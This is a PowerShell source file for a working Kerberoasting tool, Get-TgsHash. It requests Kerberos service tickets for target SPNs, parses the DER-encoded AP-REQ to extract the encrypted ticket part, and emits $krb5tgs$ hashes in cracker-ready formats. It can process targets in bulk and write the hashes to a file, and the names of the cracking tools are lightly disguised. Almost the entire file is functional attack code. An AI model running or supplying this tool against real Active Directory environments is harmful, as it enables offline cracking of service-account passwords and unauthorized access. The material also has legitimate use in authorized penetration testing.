function Get-TgsHash {
    <#
    .SYNOPSIS
        Requests a Kerberos service ticket for a given SPN and extracts the TGS-REP hash
        for offline work.

    .DESCRIPTION
        Get-TgsHash requests a Kerberos service ticket for the specified SPN using the
        provided credentials (System.IdentityModel / KerberosRequestorSecurityToken), then
        extracts the encrypted portion of the ticket for offline work with Hashxxt or John.

        The encoded AP-REQ is parsed with a proper DER/TLV walk of the ASN.1 structure to
        locate the service Ticket's enc-part, rather than matching fixed byte offsets with a
        regex. This makes extraction correct across encryption types (RC4 / AES128 / AES256)
        and variable-length fields, and the hash is formatted according to the etype the KDC
        actually returned.

        If DistinguishedName is not supplied, the function performs an LDAP query against
        Active Directory to resolve it automatically (used to derive the domain component of
        the hash). Hashes can optionally be appended to a file for bulk collection.

        Accepts pipeline input so multiple SPNs can be processed in a single run.

    .PARAMETER Spn
        The Service Principal Name of the target account (e.g. 'MSSQLSvc/sql01.corp.local:1433').
        Accepts pipeline input by property name.

    .PARAMETER SamAccountName
        The SAM account name of the target service account (e.g. 'svc_sql').
        If omitted, the username from -Credential is used. Accepts pipeline input by property name.

    .PARAMETER DistinguishedName
        The full Distinguished Name of the target account
        (e.g. 'CN=svc_sql,OU=Service Accounts,DC=corp,DC=local').
        If omitted, an LDAP query is performed to resolve it. Accepts pipeline input by property name.

    .PARAMETER Credential
        A PSCredential object used to authenticate the Kerberos ticket request and,
        if required, the LDAP lookup. Use Get-Credential to create this object.

    .PARAMETER DomainController
        Optional FQDN or IP of the domain controller to target for the LDAP lookup.
        If omitted, the default DC for the current environment is used.

    .PARAMETER OutputFile
        Optional path to a file where extracted hashes will be appended (UTF-8, one hash per line).
        The file is created if it does not exist.

    .PARAMETER Format
        Output format for the extracted hash. Valid values:
          Hashyy  - : $krb5tgs$<etype>$*<user>$<domain>$<spn>*$<checksum>$<enc>   (RC4)
                      $krb5tgs$<etype>$<user>$<domain>$<checksum>$<enc>           (AES)
          jooo    - : $krb5tgs$<spn>:<checksum>$<enc>                             (RC4)

    .EXAMPLE
        $cred = Get-Credential corp\jon
        Get-TgsHash -Spn 'MSSQLSvc/sql01.corp.local:1433' -Credential $cred

        Requests a TGS for the SQL service account and outputs the hash.

    .EXAMPLE
        $cred = Get-Credential corp\jon
        Get-TgsHash -Spn 'HTTP/web01.corp.local' -SamAccountName 'svc_web' -Credential $cred -Format jooo

        Requests a TGS and outputs the hash in John format.

    .EXAMPLE
        $cred = Get-Credential corp\jon
        $targets = @(
            [PSCustomObject]@{ Spn = 'MSSQLSvc/sql01.corp.local:1433'; SamAccountName = 'svc_sql' }
            [PSCustomObject]@{ Spn = 'HTTP/web01.corp.local';           SamAccountName = 'svc_web' }
        )
        $targets | Get-TgsHash -Credential $cred -OutputFile C:\hashes.txt

        Pipes multiple targets through the function and appends all hashes to a file.

    .EXAMPLE
        $cred = Get-Credential corp\jon
        Get-TgsHash -Spn 'MSSQLSvc/sql01.corp.local:1433' -Credential $cred `
                    -DomainController 'dc01.corp.local'

        Targets a specific DC for the LDAP lookup.

    .NOTES
        Requires the System.IdentityModel assembly (available in the full .NET Framework).
        The requesting user must have network access to a KDC.

        Import this file as a module to use the cmdlet:
            Import-Module .\Get-TgsHash.ps1

        Hash references:
          Hashxxt mode : 13100  (etype 23, use -Format Hashyy)
          Hashxxt mode : 19600  (etype 17, use -Format Hashyy)
          Hashxxt mode : 19700  (etype 18, use -Format Hashyy)
          John module  : krb5tgs (use -Format jooo)
    #>

    [CmdletBinding()]
    [OutputType([string])]
    param(
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true)]
        [string]$Spn,

        [Parameter(Mandatory = $false, ValueFromPipelineByPropertyName = $true)]
        [string]$SamAccountName,

        [Parameter(Mandatory = $false, ValueFromPipelineByPropertyName = $true)]
        [string]$DistinguishedName,

        [Parameter(Mandatory = $true)]
        [pscredential]$Credential,

        [Parameter(Mandatory = $false)]
        [string]$DomainController,

        [Parameter(Mandatory = $false)]
        [string]$OutputFile,

        [ValidateSet('Hashyy', 'jooo')]
        [string]$Format = 'Hashyy'
    )

    begin {
        # Load assembly once for the entire pipeline run (loads an existing GAC assembly — no runtime compilation)
        if (-not ([System.Management.Automation.PSTypeName]'System.IdentityModel.Tokens.KerberosRequestorSecurityToken').Type) {
            Add-Type -AssemblyName System.IdentityModel
        }

        $networkCredential = $Credential.GetNetworkCredential()
        # GetNetworkCredential() splits DOMAIN\user automatically — .UserName is clean
        $credUser = $networkCredential.UserName

        $knownEtypes = @{
            17 = 'AES128-CTS-HMAC-SHA1'
            18 = 'AES256-CTS-HMAC-SHA1'
            23 = 'RC4-HMAC'
        }

        # --- Minimal DER TLV reader: returns tag + content length + content offset ---
        function Read-Tlv([byte[]]$b, [int]$off) {
            $tag = $b[$off]
            $l1  = $b[$off + 1]
            if ($l1 -lt 0x80) {
                return @{ Tag = $tag; ContentLen = [int]$l1; ContentOff = $off + 2 }
            }
            $n = $l1 -band 0x7F
            $len = 0
            for ($i = 0; $i -lt $n; $i++) { $len = ($len -shl 8) -bor $b[$off + 2 + $i] }
            return @{ Tag = $tag; ContentLen = $len; ContentOff = ($off + 2 + $n) }
        }

        # --- Recursively locate the service Ticket ([APPLICATION 1], tag 0x61) in the AP-REQ /
        #     GSS-API frame by descending into constructed tags. The ticket precedes the
        #     authenticator, so this returns the ticket (encrypted with the service key). ---
        function Find-Ticket([byte[]]$b, [int]$off, [int]$end) {
            while ($off -lt $end -and ($off + 1) -lt $b.Length) {
                $t = Read-Tlv $b $off
                if ($t.Tag -eq 0x61) { return $t }                 # Ticket [APPLICATION 1]
                if (($t.Tag -band 0x20) -ne 0) {                   # constructed -> descend
                    $r = Find-Ticket $b $t.ContentOff ($t.ContentOff + $t.ContentLen)
                    if ($r) { return $r }
                }
                $off = $t.ContentOff + $t.ContentLen
            }
            return $null
        }

        # --- Given the raw AP-REQ bytes, return @{ Etype; CipherHex } for the ticket enc-part ---
        #   Ticket ::= [APPLICATION 1] SEQUENCE { ..., enc-part [3] EncryptedData }
        #   EncryptedData ::= SEQUENCE { etype [0] Int32, kvno [1] UInt32 OPTIONAL, cipher [2] OCTET STRING }
        function Get-EncPart([byte[]]$b) {
            $tk = Find-Ticket $b 0 $b.Length
            if (-not $tk) { throw 'service Ticket not found in AP-REQ' }

            $seq = Read-Tlv $b $tk.ContentOff                      # Ticket inner SEQUENCE
            $p   = $seq.ContentOff
            $end = $seq.ContentOff + $seq.ContentLen
            $encOff = -1
            while ($p -lt $end) {
                $t = Read-Tlv $b $p
                if ($t.Tag -eq 0xA3) { $encOff = $t.ContentOff; break }   # enc-part [3]
                $p = $t.ContentOff + $t.ContentLen
            }
            if ($encOff -lt 0) { throw 'enc-part [3] not found in ticket' }

            $ed = Read-Tlv $b $encOff                              # EncryptedData SEQUENCE
            $q  = $ed.ContentOff
            $edEnd = $ed.ContentOff + $ed.ContentLen
            $etype = $null; $cipherHex = $null
            while ($q -lt $edEnd) {
                $f = Read-Tlv $b $q
                if ($f.Tag -eq 0xA0) {                             # etype [0] INTEGER
                    $iv = Read-Tlv $b $f.ContentOff
                    $etype = $b[$iv.ContentOff + $iv.ContentLen - 1]
                }
                elseif ($f.Tag -eq 0xA2) {                         # cipher [2] OCTET STRING
                    $os = Read-Tlv $b $f.ContentOff
                    $cipherHex = ([System.BitConverter]::ToString($b, $os.ContentOff, $os.ContentLen) -replace '-', '')
                }
                $q = $f.ContentOff + $f.ContentLen
            }
            if ($null -eq $etype -or $null -eq $cipherHex) { throw 'failed to read etype/cipher from enc-part' }
            return @{ Etype = [int]$etype; CipherHex = $cipherHex }
        }
    }

    process {
        # --- Resolve SamAccountName ---
        $resolvedSam = if (-not [string]::IsNullOrEmpty($SamAccountName)) {
            $SamAccountName
        } else {
            Write-Host "[*] SamAccountName not provided — falling back to credential user: $credUser"
            $credUser
        }

        # --- Resolve DistinguishedName via LDAP if not supplied ---
        $resolvedDN = $DistinguishedName
        if ([string]::IsNullOrEmpty($resolvedDN)) {
            Write-Host "[*] DistinguishedName not provided — querying AD for: $resolvedSam"
            try {
                $ldapPath = if ($DomainController) { "LDAP://$DomainController" } else { 'LDAP://' }
                $dirEntry = New-Object System.DirectoryServices.DirectoryEntry(
                    $ldapPath,
                    $networkCredential.UserName,
                    $networkCredential.Password
                )
                $searcher = New-Object System.DirectoryServices.DirectorySearcher($dirEntry)
                $searcher.Filter = "(sAMAccountName=$resolvedSam)"
                $searcher.PropertiesToLoad.Add('distinguishedName') | Out-Null
                $result = $searcher.FindOne()

                if ($result) {
                    $resolvedDN = $result.Properties['distinguishedname'][0]
                    Write-Host "[+] Resolved DN: $resolvedDN"
                } else {
                    Write-Host "[-] No AD result for '$resolvedSam' — domain will be UNKNOWN in hash"
                    $resolvedDN = 'UNKNOWN'
                }
            } catch {
                Write-Host "[-] AD lookup failed: $($_.Exception.Message) — domain will be UNKNOWN in hash"
                $resolvedDN = 'UNKNOWN'
            }
        }

        # --- Derive domain from DN ---
        if ($resolvedDN -ne 'UNKNOWN' -and $resolvedDN -match 'DC=') {
            $UserDomain = ($resolvedDN.Substring($resolvedDN.IndexOf('DC='))) `
                -replace 'DC=', '' -replace ',', '.'
        } else {
            $UserDomain = 'UNKNOWN'
        }

        # --- Request the service ticket ---
        Write-Host "[*] Requesting ticket for: $Spn"
        try {
            $tokenID            = [Guid]::NewGuid().ToString()
            $impersonationLevel = [System.Security.Principal.TokenImpersonationLevel]::Impersonation
            $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `
                -ArgumentList $Spn, $impersonationLevel, $networkCredential, $tokenID
        } catch {
            Write-Host "[-] Failed to obtain ticket for '$Spn': $($_.Exception.Message)"
            return
        }

        $TicketByteStream = $token.GetRequest()
        if (-not $TicketByteStream) {
            Write-Host "[-] GetRequest() returned no data for '$Spn'"
            return
        }

        # --- Parse the AP-REQ (DER) and extract etype + ciphertext ---
        try {
            $enc = Get-EncPart $TicketByteStream
        } catch {
            Write-Host "[-] Unable to parse ticket for '$Spn': $($_.Exception.Message)"
            return
        }

        $Etype      = $enc.Etype
        $CipherText = $enc.CipherHex

        if ($knownEtypes.ContainsKey($Etype)) {
            Write-Host "[+] Etype $Etype ($($knownEtypes[$Etype])) captured for '$Spn'"
        } else {
            Write-Host "[!] Unknown etype $Etype for '$Spn' — hash may not be crackable"
        }

        # --- Split cipher into checksum + enc-data according to the etype ---
        #   RC4 (23)   : enc-part = [16-byte HMAC-MD5 checksum][edata]        -> checksum = first 16 bytes
        #   AES (17/18): enc-part = [edata][12-byte HMAC-SHA1-96 checksum]    -> checksum = last 12 bytes
        switch ($Etype) {
            23 {
                $Checksum = $CipherText.Substring(0, 32)
                $EncData  = $CipherText.Substring(32)
            }
            { $_ -in 17, 18 } {
                $Checksum = $CipherText.Substring($CipherText.Length - 24)
                $EncData  = $CipherText.Substring(0, $CipherText.Length - 24)
            }
            default {
                Write-Host "[!] Unsupported etype $Etype for hash formatting"
                return
            }
        }

        # --- Build hash string ---
        $HashFormat = $null
        switch ($Format) {
            'jooo' {
                if ($Etype -eq 23) {
                    $HashFormat = "`$krb5tgs`$$Spn`:$Checksum`$$EncData"
                } else {
                    Write-Host "[!] John output for AES etypes is emitted in the 19600/19700 layout — verify against your John build"
                    $HashFormat = "`$krb5tgs`$$Etype`$$resolvedSam`$$UserDomain`$$Checksum`$$EncData"
                }
            }
            'Hashyy' {
                if ($Etype -eq 23) {
                    $HashFormat = "`$krb5tgs`$23`$*$resolvedSam`$$UserDomain`$$Spn*`$$Checksum`$$EncData"
                } else {
                    $HashFormat = "`$krb5tgs`$$Etype`$$resolvedSam`$$UserDomain`$$Checksum`$$EncData"
                }
            }
        }

        Write-Output $HashFormat

        # --- Write to output file if specified ---
        if ($OutputFile) {
            try {
                Add-Content -Path $OutputFile -Value $HashFormat -Encoding UTF8
                Write-Host "[+] Hash appended to: $OutputFile"
            } catch {
                Write-Host "[-] Failed to write to '$OutputFile': $($_.Exception.Message)"
            }
        }
    }

    end {
        Write-Host "[*] Finished."
    }
}
